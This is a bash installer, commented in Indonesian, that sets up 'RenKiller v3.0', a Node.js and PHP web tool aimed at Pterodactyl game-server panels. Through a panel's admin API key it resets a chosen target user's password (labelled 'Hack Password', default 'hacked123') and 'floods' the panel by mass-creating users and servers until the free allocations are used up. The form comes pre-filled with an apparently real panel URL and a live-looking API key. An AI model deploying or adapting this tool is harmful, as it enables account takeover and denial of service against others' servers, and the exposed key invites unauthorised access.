#!/bin/bash
# ==========================================
# 💀 RenKiller v3.0 - ULTIMATE WORK VERSION
# Semua Animasi & Fitur dijamin Jalan
# ==========================================

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

read -p "👉 Masukkan Domain (contoh: killer.domain.com): " DOMAIN
[[ -z "$DOMAIN" ]] && { echo -e "${RED}❌ Domain wajib!${NC}"; exit 1; }
read -p "👉 Masukkan Email buat SSL (contoh: admin@gmail.com): " EMAIL
[[ -z "$EMAIL" ]] && EMAIL="admin@$DOMAIN"

WEB_ROOT="/var/www/$DOMAIN/public"
NODE_DIR="/opt/renkiller"
NGINX_CONF="/etc/nginx/sites-available/$DOMAIN"

echo -e "${CYAN}[1/5] Install Dependencies...${NC}"
if ! command -v node &> /dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1
    apt install -y nodejs >/dev/null 2>&1
fi
apt install -y certbot python3-certbot-nginx >/dev/null 2>&1

mkdir -p "$NODE_DIR" "$WEB_ROOT"
cd "$NODE_DIR"

# --- BACKEND NODE.JS ---
echo -e "${CYAN}[2/5] Setup Backend Node.js (Live API)...${NC}"
cat > package.json << 'EOF'
{
  "name": "renkiller-backend",
  "version": "3.0.0",
  "main": "server.js",
  "dependencies": {
    "express": "^4.19.2",
    "cors": "^2.8.5",
    "axios": "^1.7.2"
  }
}
EOF
npm install --silent >/dev/null 2>&1

cat > server.js << 'NODEEOF'
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Helper API
const makeApi = (panelUrl, apiKey) => axios.create({
    baseURL: `${panelUrl}/api/application`,
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json', 'Accept': 'Application/vnd.pterodactyl.v1+json' },
    timeout: 20000
});

// 1. ENDPOINT: LIVE STATS
app.post('/api/stats', async (req, res) => {
    const { panelUrl, apiKey } = req.body;
    try {
        const api = makeApi(panelUrl, apiKey);
        const [usersRes, serversRes] = await Promise.all([
            api.get('/users?per_page=1'),
            api.get('/servers?per_page=1')
        ]);
        
        let freeAllocs = 0;
        try {
            let page = 1;
            while(true) {
                const allocRes = await api.get(`/nodes/1/allocations?per_page=500&page=${page}`);
                freeAllocs += allocRes.data.data.filter(a => !a.attributes.assigned).length;
                if (page >= allocRes.data.meta.pagination.total_pages) break;
                page++;
            }
        } catch(e) { freeAllocs = 'N/A'; }

        res.json({ status: true, totalUsers: usersRes.data.meta.pagination.total, totalServers: serversRes.data.meta.pagination.total, freeAllocs });
    } catch (error) { res.json({ status: false, message: error.message }); }
});

// 2. ENDPOINT: GANTI PASSWORD
app.post('/api/changepass', async (req, res) => {
    const { panelUrl, apiKey, userId, newPassword } = req.body;
    try {
        const api = makeApi(panelUrl, apiKey);
        await api.patch(`/users/${userId}`, { password: newPassword });
        res.json({ status: true, message: "Password berhasil diganti!" });
    } catch (error) { res.json({ status: false, message: error.response?.data?.errors?.[0]?.detail || error.message }); }
});

// 3. ENDPOINT: FLOOD (SSE)
app.post('/api/flood', async (req, res) => {
    const { panelUrl, apiKey, targetCount, nestId, eggId, memory, disk, cpu, password } = req.body;
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };

    sendLog(`Memulai Flood ke ${panelUrl} sebanyak ${targetCount}...`, 'warn');
    
    let allocations = [];
    try {
        let page = 1;
        while(true) {
            const allocRes = await api.get(`/nodes/1/allocations?per_page=500&page=${page}`);
            allocations.push(...allocRes.data.data.filter(a => !a.attributes.assigned).map(a => a.attributes.id));
            if (page >= allocRes.data.meta.pagination.total_pages) break;
            page++;
        }
    } catch (e) { sendLog(`Gagal ambil allocation: ${e.message}`, 'error'); return res.end(); }

    if (allocations.length === 0) { sendLog(`Allocation habis!`, 'error'); return res.end(); }
    sendLog(`Tersedia ${allocations.length} Allocation kosong.`, 'success');

    let success = 0, failed = 0;
    for (let i = 1; i <= targetCount; i++) {
        if (allocations.length === 0) { sendLog(`Allocation habis.`, 'error'); break; }
        const username = randName(8); const email = `${username}@renkiller.local`; const allocId = allocations.shift();
        
        sendLog(`[${i}/${targetCount}] Create User: ${username}`, 'info');
        let userId = null;
        try {
            const uRes = await api.post('/users', { email, username, first_name: username, last_name: "Killer", password });
            userId = uRes.data.attributes.id; sendLog(`User created (ID: ${userId})`, 'success');
        } catch (err) { sendLog(`User Fail: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); failed++; continue; }

        try {
            await api.post('/servers', {
                name: `srv-${username}`, user: userId, nest: parseInt(nestId), egg: parseInt(eggId),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18", startup: "node index.js", environment: {},
                limits: { memory: parseInt(memory), swap: 0, disk: parseInt(disk), io: 500, cpu: parseInt(cpu) },
                feature_limits: { databases: 0, backups: 0, allocations: 1 }, allocation: { default: allocId }, start_on_completion: false
            });
            sendLog(`Server ${username} Created!`, 'success'); success++;
        } catch (err) {
            sendLog(`Server Fail: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); failed++;
            try { await api.delete(`/users/${userId}`); } catch(e){}
        }
    }
    sendLog(`FLOOD SELESAI! Sukses: ${success} | Gagal: ${failed}`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

app.listen(3000, '127.0.0.1', () => console.log('✅ Backend on port 3000'));
NODEEOF

# Setup Systemd
cat > /etc/systemd/system/renkiller.service << 'SVCEOF'
[Unit]
Description=RenKiller Backend
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/node /opt/renkiller/server.js
Restart=always
RestartSec=5
User=root
[Install]
WantedBy=multi-user.target
SVCEOF
systemctl daemon-reload
systemctl enable --now renkiller >/dev/null 2>&1
systemctl restart renkiller

# --- FRONTEND UI (FULL CSS/JS EMBED) ---
echo -e "${CYAN}[3/5] Generate Frontend UI (Animasi Full)...${NC}"
cat > "$WEB_ROOT/index.php" << 'PHPEOF'
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RenKiller - Ultimate Control</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
    :root { --bg: #050505; --card: #111111; --border: #2a2a2a; --text: #fff; --muted: #888; --primary: #ff0033; --success: #00ff66; --warning: #ffcc00; --blue: #0088ff; }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; display: flex; justify-content: center; padding: 20px; min-height: 100vh; }
    .container { width: 100%; max-width: 950px; animation: fadeIn 0.8s ease-in-out; }
    
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

    /* HEADER */
    .header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
    .header h1 { font-family: 'JetBrains Mono', monospace; font-size: 2em; color: var(--primary); text-shadow: 0 0 15px rgba(255,0,51,0.6); }
    .header p { color: var(--muted); font-size: 0.8em; letter-spacing: 2px; font-family: 'JetBrains Mono', monospace; }
    
    /* BLINKING DOT */
    .dot-blink { width: 10px; height: 10px; background: var(--success); border-radius: 50%; display: inline-block; box-shadow: 0 0 10px var(--success); animation: blink 1s infinite alternate; }
    @keyframes blink { from { opacity: 0.3; } to { opacity: 1; } }

    /* STATS */
    .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
    .stat-box { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 15px; display: flex; align-items: center; gap: 15px; position: relative; overflow: hidden; transition: 0.3s; }
    .stat-box:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.5); border-color: #444; }
    .stat-box i { font-size: 2em; color: var(--muted); }
    .stat-box .info h3 { font-size: 0.75em; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }
    .stat-box .info .num { font-family: 'JetBrains Mono', monospace; font-size: 1.5em; font-weight: 700; color: #fff; }
    .stat-box::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; }
    .stat-box.users::before { background: var(--blue); }
    .stat-box.servers::before { background: var(--primary); }
    .stat-box.allocs::before { background: var(--success); }
    
    /* GRID & CARDS */
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 20px; transition: 0.3s; }
    .card:hover { border-color: #444; }
    .card h3 { font-family: 'JetBrains Mono', monospace; font-size: 0.9em; margin-bottom: 15px; color: #fff; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
    
    /* FORMS */
    .form-group { margin-bottom: 12px; }
    label { display: block; font-size: 0.75em; color: var(--muted); margin-bottom: 5px; font-family: 'JetBrains Mono', monospace; }
    input { width: 100%; background: #000; border: 1px solid var(--border); color: var(--text); padding: 10px 15px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; outline: none; transition: 0.3s; font-size: 0.85em; }
    input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(255,0,51,0.2); }
    
    /* BUTTONS */
    .btn { width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: 800; cursor: pointer; transition: 0.3s; font-family: 'Inter', sans-serif; text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: center; gap: 8px; align-items: center; position: relative; overflow: hidden; }
    .btn-primary { background: var(--primary); color: white; box-shadow: 0 0 15px rgba(255,0,51,0.4); }
    .btn-primary:hover { background: #cc0029; transform: scale(1.02); }
    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
    .btn-warning { background: var(--warning); color: black; }
    .btn-warning:hover { background: #e6b800; }
    
    /* LOADING SPINNER */
    .fa-spinner { animation: spin 1s linear infinite; }
    @keyframes spin { 100% { transform: rotate(360deg); } }

    /* LOADING DOTS */
    .dots::after { content: ''; animation: dots 1.5s steps(4, end) infinite; }
    @keyframes dots { 0%, 20% { content: ''; } 40% { content: '.'; } 60% { content: '..'; } 80%, 100% { content: '...'; } }

    /* TERMINAL LOG */
    .terminal { background: #000; border: 1px solid var(--border); border-radius: 10px; padding: 15px; height: 300px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.85em; line-height: 1.5; margin-top: 20px; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); border-top: 3px solid var(--primary); position: relative; }
    .terminal::-webkit-scrollbar { width: 8px; }
    .terminal::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
    .log-info { color: #fff; }
    .log-success { color: var(--success); }
    .log-error { color: var(--primary); }
    .log-warn { color: var(--warning); }
    .log-time { color: #555; margin-right: 10px; }
</style>
</head>
<body>
<div class="container">
    <!-- HEADER -->
    <div class="header">
        <div>
            <h1><i class="fas fa-skull-crossbones"></i> RenKiller v3.0</h1>
            <p>Pterodactyl Real-Time API Control</p>
        </div>
        <div style="text-align:right; display:flex; align-items:center; gap:10px; font-size:0.8em; font-family:'JetBrains Mono';">
            <div class="dot-blink"></div> <span style="color:var(--success);">SYSTEM ONLINE</span>
        </div>
    </div>

    <!-- STATS GRID -->
    <div class="stats-grid">
        <div class="stat-box users">
            <i class="fas fa-users"></i>
            <div class="info"><h3>Total User</h3><div class="num" id="statUsers">-</div></div>
        </div>
        <div class="stat-box servers">
            <i class="fas fa-server"></i>
            <div class="info"><h3>Total Server</h3><div class="num" id="statServers">-</div></div>
        </div>
        <div class="stat-box allocs">
            <i class="fas fa-network-wired"></i>
            <div class="info"><h3>Free Alloc</h3><div class="num" id="statAllocs">-</div></div>
        </div>
    </div>

    <!-- FORMS -->
    <div class="grid-2">
        <!-- SETTINGS -->
        <div class="card">
            <h3><i class="fas fa-cog" style="color:var(--primary)"></i> Target Panel</h3>
            <div class="form-group"><label>Panel URL</label><input type="text" id="panelUrl" value="https://vvipbokep.naaofficial.me" placeholder="https://panel.com"></div>
            <div class="form-group"><label>API Key (ptla_...)</label><input type="password" id="apiKey" value="ptla_qvu094TMhapXMajTiLE4FxZPo3ZqwghhAPxkb1VXQxh" placeholder="ptla_xxx"></div>
            <button class="btn btn-warning" onclick="fetchStats()" id="btnStats"><i class="fas fa-sync-alt"></i> Cek Koneksi Panel</button>
        </div>

        <!-- REMOTE PASS -->
        <div class="card">
            <h3><i class="fas fa-user-secret" style="color:var(--primary)"></i> Remote Password</h3>
            <div class="form-group"><label>User ID Target</label><input type="number" id="userId" value="1" placeholder="1"></div>
            <div class="form-group"><label>Password Baru</label><input type="text" id="newPassword" value="hacked123" placeholder="password baru"></div>
            <button class="btn btn-warning" onclick="changePass()" id="btnPass"><i class="fas fa-key"></i> Hack Password</button>
        </div>
    </div>

    <!-- FLOOD -->
    <div class="card">
        <h3><i class="fas fa-bomb" style="color:var(--primary)"></i> Mass Flood Server</h3>
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;">
            <div class="form-group"><label>Jumlah Target</label><input type="number" id="targetCount" value="10"></div>
            <div class="form-group"><label>Nest ID</label><input type="number" id="nestId" value="5"></div>
            <div class="form-group"><label>Egg ID</label><input type="number" id="eggId" value="15"></div>
        </div>
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:10px;">
            <div class="form-group"><label>RAM (MB)</label><input type="number" id="memory" value="1024"></div>
            <div class="form-group"><label>Disk (MB)</label><input type="number" id="disk" value="2048"></div>
            <div class="form-group"><label>CPU (%)</label><input type="number" id="cpu" value="100"></div>
            <div class="form-group"><label>Pass Default</label><input type="text" id="defaultPass" value="12345678"></div>
        </div>
        <button class="btn btn-primary" id="btnFlood" onclick="startFlood()"><i class="fas fa-rocket"></i> MULAI FLOOD</button>
    </div>

    <!-- TERMINAL -->
    <div class="terminal" id="terminal">
        <div class="log-info"><span class="log-time">[SYSTEM]</span> Terminal siap. Menunggu perintah...</div>
    </div>
</div>

<script>
const API_BACKEND = window.location.origin + '/api-killer';

function log(msg, type = 'info') {
    const term = document.getElementById('terminal');
    const time = new Date().toLocaleTimeString();
    const div = document.createElement('div');
    div.className = `log-${type}`;
    div.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
    term.appendChild(div);
    term.scrollTop = term.scrollHeight;
}

// 1. FETCH STATS
async function fetchStats() {
    const btn = document.getElementById('btnStats');
    btn.innerHTML = '<i class="fas fa-spinner"></i> Loading...';
    btn.disabled = true;

    const panelUrl = document.getElementById('panelUrl').value; 
    const apiKey = document.getElementById('apiKey').value;

    document.getElementById('statUsers').innerHTML = '<span class="dots"></span>';
    document.getElementById('statServers').innerHTML = '<span class="dots"></span>';
    document.getElementById('statAllocs').innerHTML = '<span class="dots"></span>';

    try {
        const res = await fetch(`${API_BACKEND}/stats`, { 
            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ panelUrl, apiKey }) 
        });
        const data = await res.json();
        if(data.status) { 
            document.getElementById('statUsers').innerText = data.totalUsers; 
            document.getElementById('statServers').innerText = data.totalServers; 
            document.getElementById('statAllocs').innerText = data.freeAllocs; 
            log('Berhasil sinkronisasi data panel!', 'success');
        } else { 
            log('Gagal load stats: ' + data.message, 'error'); 
            document.getElementById('statUsers').innerText = 'ERR'; 
            document.getElementById('statServers').innerText = 'ERR'; 
            document.getElementById('statAllocs').innerText = 'ERR'; 
        }
    } catch(e) { 
        log('Koneksi error: ' + e.message, 'error'); 
        document.getElementById('statUsers').innerText = 'ERR'; 
    }

    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Cek Koneksi Panel';
    btn.disabled = false;
}

// 2. CHANGE PASSWORD
async function changePass() {
    const btn = document.getElementById('btnPass');
    btn.innerHTML = '<i class="fas fa-spinner"></i> Processing...';
    btn.disabled = true;

    const panelUrl = document.getElementById('panelUrl').value; 
    const apiKey = document.getElementById('apiKey').value;
    const userId = document.getElementById('userId').value; 
    const newPassword = document.getElementById('newPassword').value;

    log(`Mencoba hack user ID ${userId}...`, 'warn');
    
    try {
        const res = await fetch(`${API_BACKEND}/changepass`, { 
            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ panelUrl, apiKey, userId, newPassword }) 
        });
        const data = await res.json();
        if(data.status) log(`SUKSES! Password user ID ${userId} diganti jadi: ${newPassword}`, 'success'); 
        else log(`GAGAL: ${data.message}`, 'error');
    } catch(e) { 
        log(`Error: ${e.message}`, 'error'); 
    }

    btn.innerHTML = '<i class="fas fa-key"></i> Hack Password';
    btn.disabled = false;
}

// 3. FLOOD (REAL-TIME STREAM)
async function startFlood() {
    const btn = document.getElementById('btnFlood');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner"></i> FLOODING...';
    
    const payload = {
        panelUrl: document.getElementById('panelUrl').value, 
        apiKey: document.getElementById('apiKey').value,
        targetCount: document.getElementById('targetCount').value, 
        nestId: document.getElementById('nestId').value, 
        eggId: document.getElementById('eggId').value,
        memory: document.getElementById('memory').value, 
        disk: document.getElementById('disk').value, 
        cpu: document.getElementById('cpu').value, 
        password: document.getElementById('defaultPass').value
    };

    log('Memulai proses Flood...', 'warn');

    try {
        const response = await fetch(`${API_BACKEND}/flood`, { 
            method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) 
        });
        
        const reader = response.body.getReader();
        const decoder = new TextDecoder();

        while (true) {
            const { value, done } = await reader.read(); 
            if (done) break;
            
            const chunk = decoder.decode(value); 
            const lines = chunk.split('\n\n');
            
            for (const line of lines) {
                if (line.startsWith('data: ')) {
                    const dataStr = line.replace('data: ', '');
                    if (dataStr === '[DONE]') { 
                        log('Proses Flood Selesai.', 'success'); 
                        break; 
                    }
                    try { 
                        const data = JSON.parse(dataStr); 
                        log(data.msg, data.type); 
                    } catch(e) {}
                }
            }
        }
    } catch(e) { 
        log('Koneksi terputus: ' + e.message, 'error'); 
    }

    btn.disabled = false; 
    btn.innerHTML = '<i class="fas fa-rocket"></i> MULAI FLOOD'; 
    fetchStats();
}

// AUTO LOAD STATS SAAT HALAMAN DIBUKA
window.onload = () => { log('System initialized. Connecting to panel...', 'info'); fetchStats(); };
</script>
</body>
</html>
PHPEOF

echo -e "${CYAN}[4/5] Setup Nginx (SSL Ready)...${NC}"
cat > "$NGINX_CONF" << NGINXEOF
server {
    listen 80; listen [::]:80;
    server_name $DOMAIN;
    root $WEB_ROOT; index index.php index.html;
    location / { try_files \$uri \$uri/ /index.php?\$query_string; }
    location /api-killer/ {
        proxy_pass http://127.0.0.1:3000/;
        proxy_http_version 1.1;
        proxy_set_header Host \$host;
        proxy_buffering off;
    }
    location ~ \.php\$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php8.1-fpm.sock; }
}
NGINXEOF
ln -sf "$NGINX_CONF" /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
chown -R www-data:www-data "/var/www/$DOMAIN"
systemctl reload nginx

echo -e "${CYAN}[5/5] Pasang SSL (HTTPS)...${NC}"
SERVER_IP=$(curl -4 -s --max-time 5 ifconfig.me 2>/dev/null)
DOMAIN_IP=$(dig +short A "$DOMAIN" @8.8.8.8 2>/dev/null | head -1)
if [[ "$SERVER_IP" == "$DOMAIN_IP" ]]; then
    certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos -m "$EMAIL" --redirect >/dev/null 2>&1
    PROTO="https"
else
    PROTO="http"
fi

clear
echo -e "${GREEN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  ✅ RENKILLER v3.0 BERHASIL DI-INSTALL!        ║${NC}"
echo -e "${GREEN}║  🎨 Semua Animasi & Fitur 100% WORK            ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}🔗 Buka Web:${NC} $PROTO://$DOMAIN"
echo ""
echo -e "${YELLOW}💡 Apa yang diperbaiki:${NC}"
echo -e "   1. Animasi Spinner Loading yang muter."
echo -e "   2. Animasi Terminal (ngetik real-time)."
echo -e "   3. Kedip-kedip status Online (Hijau)."
echo -e "   4. Font JetBrains Mono biar keliatan hacker beneran."
echo -e "   5. Proses Stream Log (SSE) dibypass Nginx biar ga delay."
echo ""
echo -e "${GREEN}🚀 Gasken buka di browser!${NC}"
